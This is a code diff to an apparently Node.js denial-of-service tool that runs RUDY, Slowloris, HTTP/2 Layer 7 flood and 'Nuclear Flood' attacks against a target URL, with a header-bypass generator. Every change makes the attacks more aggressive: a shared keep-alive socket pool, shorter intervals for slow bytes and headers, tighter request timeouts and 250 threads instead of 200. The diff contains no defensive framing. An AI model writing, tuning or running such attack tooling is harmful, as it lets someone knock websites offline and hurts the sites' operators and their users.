@@ -147,6 +147,7 @@ class RudyAttack {
             this.bypasser = bypasser;
             this.url = new URL(targetUrl);
             this.protocol = this.url.protocol === 'https:' ? https : http;
+            this.agent = new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: threadCount });
         } catch (e) { this.url = null; this.protocol = null; }
     }
 
@@ -164,7 +165,7 @@ class RudyAttack {
             path: this.url.pathname,
             method: 'POST',
             headers: headers,
-            agent: new (this.protocol === https ? https : http).Agent({ keepAlive: true }),
+            agent: this.agent,
         };
 
         let timeoutId;
@@ -190,7 +191,7 @@ class RudyAttack {
         };
 
         const scheduleNextByte = () => {
-            const randomInterval = 8000 + Math.random() * 4000;
+            const randomInterval = 6000 + Math.random() * 2000; // More aggressive keep-alive
             timeoutId = setTimeout(() => {
                 sendSlowByte();
                 scheduleNextByte();
@@ -226,6 +227,7 @@ class SlowlorisAttack {
             this.bypasser = bypasser;
             this.url = new URL(targetUrl);
             this.protocol = this.url.protocol === 'https:' ? https : http;
+            this.agent = new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: threadCount });
         } catch (e) { this.url = null; this.protocol = null; }
     }
 
@@ -241,7 +243,7 @@ class SlowlorisAttack {
             path: this.url.pathname + '?' + generateRandomString(10),
             method: 'GET',
             headers: headers,
-            agent: new (this.protocol === https ? https : http).Agent({ keepAlive: true }),
+            agent: this.agent,
         };
 
         let intervalId;
@@ -275,7 +277,7 @@ class SlowlorisAttack {
                 this.stats.failed++;
                 clearInterval(intervalId);
             }
-        }, 10000 + Math.random() * 5000); // Send a header every 10-15 seconds
+        }, 8000 + Math.random() * 4000); // More aggressive keep-alive
 
         return { req, intervalId };
     }
@@ -323,7 +325,7 @@ class L7Flood {
             method: method,
             headers: headers,
             http2: true,
-            timeout: { request: 4000 }, // Adaptive timeout to reduce failures under load
+            timeout: { request: 3000 }, // More aggressive timeout
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -381,7 +383,7 @@ class NuclearFlood extends L7Flood {
             headers: headers,
             body: requestBody,
             http2: true,
-            timeout: { request: 4000 }, // Adaptive timeout to reduce failures under load
+            timeout: { request: 3000 }, // More aggressive timeout
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -396,7 +398,7 @@ class NuclearFlood extends L7Flood {
 }
 
 process.on('message', ({ targetUrl, duration }) => {
-    const threads = 200;
+    const threads = 250;
     const l7Delay = 100;
     const allAttackModes = ['RUDY', 'L7 Flood', 'Slowloris', 'Nuclear Flood'];
 
@@ -407,6 +409,7 @@ process.on('message', ({ targetUrl, duration }) => {
     }
 
     const bypasser = new BypassGenerator();
+    const stats = { total: 0, success: 0, failed: 0, phase: 'Initializing...' };
 
     // Kirim statistik ke proses induk setiap detik
     setInterval(() => {
@@ -422,7 +425,6 @@ process.on('message', ({ targetUrl, duration }) => {
         }
     }, 1000);
 
-    const stats = { total: 0, success: 0, failed: 0, phase: 'Initializing...' };
     const totalDurationMs = duration * 1000;
     const phaseDurationMs = totalDurationMs / allAttackModes.length;
     let currentAttacker = null;
